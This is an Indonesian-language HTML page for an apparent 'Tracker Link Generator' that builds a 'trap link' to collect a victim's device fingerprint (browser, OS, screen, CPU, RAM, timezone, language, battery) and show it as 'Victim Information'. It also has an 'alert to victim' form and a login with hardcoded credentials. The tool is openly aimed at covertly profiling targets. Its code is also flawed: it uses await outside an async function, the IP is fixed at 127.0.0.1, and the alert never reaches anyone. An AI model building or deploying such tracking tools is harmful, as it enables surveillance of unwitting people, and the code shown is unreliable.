<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>ğŸ¯ Tracker Link Generator (Live)</title>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <style>
    body {
      background: #0b0c10;
      color: #e0e0e0;
      font-family: 'Poppins', sans-serif;
      margin: 0;
      padding: 20px;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 100vh;
    }

    h2 {
      color: #f5f5f5;
      text-align: center;
      margin-bottom: 20px;
      font-weight: 600;
    }

    input, button {
      padding: 12px 16px;
      border-radius: 12px;
      font-size: 16px;
      border: none;
      margin-bottom: 12px;
      width: 100%;
      box-sizing: border-box;
      transition: all 0.2s ease;
    }

    input {
      background: #1f2833;
      color: #e0e0e0;
      border: 1px solid #45a29e;
    }

    input:focus {
      outline: none;
      border-color: #66fcf1;
      box-shadow: 0 0 8px #66fcf1;
    }

    button {
      background: linear-gradient(90deg, #45a29e, #66fcf1);
      color: #0b0c10;
      font-weight: 600;
      cursor: pointer;
      border: 1px solid #45a29e;
    }

    button:hover {
      background: linear-gradient(90deg, #66fcf1, #45a29e);
      color: #0b0c10;
      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
    }

    .container {
      width: 100%;
      max-width: 520px;
      background: #1c1c1c;
      padding: 30px;
      border-radius: 20px;
      box-shadow: 0 0 30px rgba(0,0,0,0.6);
    }

    .link-result {
      font-size: 14px;
      margin: 15px 0;
      word-break: break-word;
      padding: 10px;
      background: #16202c;
      border-radius: 12px;
      border: 1px solid #45a29e;
    }

    .link-result a {
      color: #66fcf1;
      text-decoration: none;
      font-weight: 500;
    }

    .victim-box {
      margin-top: 20px;
      background: #16202c;
      border-radius: 16px;
      padding: 18px;
      font-size: 14px;
      border: 1px solid #45a29e;
      box-shadow: 0 0 15px rgba(0,0,0,0.4);
      white-space: pre-wrap;
    }

    .victim-box h3 {
      margin-bottom: 12px;
      font-size: 18px;
      color: #66fcf1;
      font-weight: 600;
    }

    img.snapshot {
      max-width: 100%;
      border-radius: 12px;
      margin-top: 12px;
      border: 1px solid #45a29e;
    }

    #loginBox p {
      margin-top: -8px;
      font-size: 14px;
    }

  </style>
</head>
<body>
  <div class="container">

    <!-- LOGIN -->
    <div id="loginBox">
      <h2>ğŸ” Login</h2>
      <input type="text" id="username" placeholder="Username" />
      <input type="password" id="password" placeholder="Password" />
      <button onclick="login()">Login</button>
      <p id="loginMsg" style="color:#ff6b6b;"></p>
    </div>

    <!-- KONTEN UTAMA -->
    <div id="mainContent" style="display:none;">
      <h2>ğŸ¯ Tracker Link Generator</h2>

      <form onsubmit="generateLink(event)">
        <input type="url" id="target" placeholder="https://example.com" required />
        <button type="submit">Generate Link</button>
      </form>

      <form onsubmit="sendCustomAlert(event)">
        <input type="text" id="customMsg" placeholder="ğŸ“¢ Pesan alert ke korban..." />
        <button type="submit">Kirim Alert</button>
      </form>

      <div class="link-result" id="generatedLink"></div>

      <div id="resultBox" class="victim-box" style="display: none;">
        <h3>âœ… Victim Information</h3>
        <div id="resultOutput">Menunggu korban...</div>
        <div id="mapBox" style="margin-top:10px;"></div>
        <div id="imgBox" style="margin-top:10px;"></div>
      </div>
    </div>
  </div>

  <script>
    // ===== LOGIN =====
    const validUsers = [
      { user: "admin", pass: "1234" },
      { user: "putra", pass: "putra123" }
    ];

    function login() {
      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();
      const msgBox = document.getElementById("loginMsg");

      const valid = validUsers.find(u => u.user === username && u.pass === password);
      if (valid) {
        msgBox.textContent = "âœ… Login berhasil!";
        document.getElementById("loginBox").style.display = "none";
        document.getElementById("mainContent").style.display = "block";
      } else {
        msgBox.textContent = "âŒ Username atau password salah!";
      }
    }

    // ===== TRACKER FRONTEND =====
    let currentCode = null;
    let fetched = false;
    let logs = [];

    function generateLink(e) {
      e.preventDefault();
      const input = document.getElementById("target").value.trim();
      if (!input) return;

      const code = Math.random().toString(36).substring(2, 10);
      currentCode = code;

      // Buat link jebakan frontend
      const link = `javascript:(function(){
        const info = {
          ip: '127.0.0.1',
          access_time: new Date().toLocaleTimeString(),
          local_time: new Date().toLocaleString(),
          user_agent: navigator.userAgent,
          platform: navigator.platform,
          screen: window.screen.width + 'x' + window.screen.height,
          window: window.innerWidth + 'x' + window.innerHeight,
          orientation: screen.orientation?.type || 'unknown',
          dpr: window.devicePixelRatio,
          cpu: navigator.hardwareConcurrency,
          ram: navigator.deviceMemory || 'N/A',
          language: navigator.language,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          touch: 'ontouchstart' in window,
          maxTouchPoints: navigator.maxTouchPoints,
          cookies: navigator.cookieEnabled,
          online: navigator.onLine,
          doNotTrack: navigator.doNotTrack,
          webdriver: navigator.webdriver || false,
          pdfViewerEnabled: typeof navigator.pdfViewerEnabled !== 'undefined',
          battery: navigator.getBattery ? await navigator.getBattery() : null,
          tracker_id: '${code}'
        };
        window.opener.postMessage(info, '*');
        window.open('${input}','_blank');
      })()`;

      document.getElementById("generatedLink").innerHTML = `ğŸ”— <a href="${link}" target="_blank">Klik Link Jebakan</a>`;
      document.getElementById("resultOutput").textContent = "Menunggu korban...";
      document.getElementById("resultBox").style.display = "block";
    }

    // Terima info dari link jebakan
    window.addEventListener("message", (event) => {
      const v = event.data;
      logs.push(v);
      renderFullResult(v);
    });

    function renderFullResult(v) {
      const result = `
âš“ IP: ${v.ip} | Time: ${v.access_time}
â³ Date In Victim's Device : ${v.local_time}

ğŸ“± DEVICE OVERVIEW
ğŸ“² Device Name: ${v.user_agent}
ğŸ’» Operating System: ${parseOS(v.user_agent)}
ğŸŒ Browser: ${parseBrowser(v.user_agent)}
ğŸ”§ Platform: ${v.platform || 'N/A'}

ğŸ–¥ï¸ DISPLAY DETAILS
ğŸ“ Screen Size: ${v.screen}
ğŸªŸ Window Size: ${v.window}
ğŸ¨ Color Quality: 24-bit
ğŸ”„ Orientation: ${v.orientation || 'unknown'}
ğŸ“Š Pixel Density: ${v.dpr}x

âš¡ PERFORMANCE INFO
ğŸ§  CPU Cores: ${v.cpu}
ğŸ’¾ Device RAM: ${v.ram}
ğŸŒ Language: ${v.language}
ğŸ• Timezone: ${v.timezone}

ğŸ‘† INPUT CAPABILITIES
ğŸ“± Touch Screen: âœ… ${v.touch ? 'Yes' : 'No'}
ğŸ–ï¸ Max Touch Points: ${v.maxTouchPoints || 'N/A'}
ğŸª Cookies: âœ… ${v.cookies ? 'Enabled' : 'Disabled'}
ğŸŒ Online Status: âœ… ${v.online ? 'Connected' : 'Disconnected'}

ğŸ”’ SECURITY FEATURES
ğŸš« Do Not Track: ${v.doNotTrack === '1' ? 'âœ… Enabled' : 'âŒ Disabled'}
ğŸ¤– Webdriver: ${v.webdriver ? 'âŒ Detected' : 'âœ… Not Detected'}
ğŸ“„ PDF Viewer: ${v.pdfViewerEnabled ? 'âœ… Available' : 'âŒ Not Available'}
      `;
      document.getElementById("resultOutput").textContent = result;
    }

    function parseOS(ua) {
      if (ua.includes("Android")) return "Android";
      if (ua.includes("iPhone")) return "iOS";
      if (ua.includes("Windows")) return "Windows";
      if (ua.includes("Mac OS")) return "macOS";
      return "Unknown";
    }

    function parseBrowser(ua) {
      if (ua.includes("Chrome")) return "Chrome";
      if (ua.includes("Firefox")) return "Firefox";
      if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
      if (ua.includes("Edg")) return "Edge";
      return "Unknown";
    }

    function sendCustomAlert(e) {
      e.preventDefault();
      const msg = document.getElementById("customMsg").value.trim();
      if (!msg || !currentCode) return;
      alert(`ğŸ“¢ Alert dikirim ke korban: ${msg}`);
    }
  </script>
</body>
</html>
